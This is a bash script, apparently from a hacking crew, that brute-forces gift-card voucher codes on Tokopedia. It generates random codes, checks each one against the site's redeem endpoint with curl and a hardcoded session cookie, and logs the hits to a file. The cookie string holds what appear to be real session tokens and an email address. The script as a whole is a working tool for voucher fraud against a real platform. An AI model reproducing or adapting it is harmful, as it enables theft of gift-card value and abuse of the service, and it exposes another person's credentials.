#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUyNDQ5MjkxOXxJakZPVDBWbWR6TllZMlZDU0V4WVowcG9iakJIYldkTGRFVnBXa1pSVFhkSWNHbG1aekkwU0RkYVExRTlJZ289fNdjIpcNFt3gjWkz-iD448-wHKRQofrQ9cy9xYEUfId5; _BID_TOKOPEDIA_=270b50252c10cc87501fd0002072f346; insUserData=%7B%22email%22%3A%22pandupatanmanurung%40india2in.com%22%7D; __sonar=12417927914068536433; state=eyJsZCI6Imh0dHBzOi8vYWNjb3VudHMudG9rb3BlZGlhLmNvbS90aGFua3M_dGhlbWU9ZGVmYXVsdFx1MDAyNmxkPVx1MDAyNmFjdGl2YXRpb25fdHlwZT01IiwicmVmIjoiaHR0cHM6Ly93d3cudG9rb3BlZGlhLmNvbSIsInV1aWQiOiI1N2Q0YmEyNi1lN2YwLTRmMzAtYjhhNS1hNzBmYWY5ZmI1YTMiLCJ0aGVtZSI6ImRlZmF1bHQifQ; _dc_gtm_UA-9801603-1=1; l=1; ins-gaSSId=ed002064-b8c7-58d8-ca80-f432db0a8b73_1524496406; scs=%7B%22t%22%3A1%7D; insdrSV=4; _ID_autocomplete_=bab263c479464f25b727d8a4bdfc5e90; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiNDEwNGEzNTItZjNlZS00Njg3LTk3NmItYzY1ZmJjZjllOWVjIiwiaXNfYWpheCI6dHJ1ZX0; _SID_Tokopedia_=WMYja7IxnILtHLBm-B5qNi4uCFdyXFhn9O0nNce0agr1s3RadRUFh3ldER0VNI8M2yIfEyq0DrgVw_qb6PqW3AwflHxgCSeCbUxo3Myc1LFbMNPgQzFSYWfwV6NSGiIx; _gat_UA-9801603-1=1; pulsa-aff=undefined; _uetsid=_uet2337ced7; _ga=GA1.2.1930070457.1524492798; _gid=GA1.2.102091659.1524492798; _dc_gtm_UA-9801603-23=1; _ampSES=d1a18c84c4SESb1d8aaf33cdb-30798-1524492921127; _ampUITN=14505cbb11botd7fdb8d63fe8-30798-1524492921132; _ampNV=0; _ampRV=1; _ampCon=Canada; _ampCity=Montreal"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
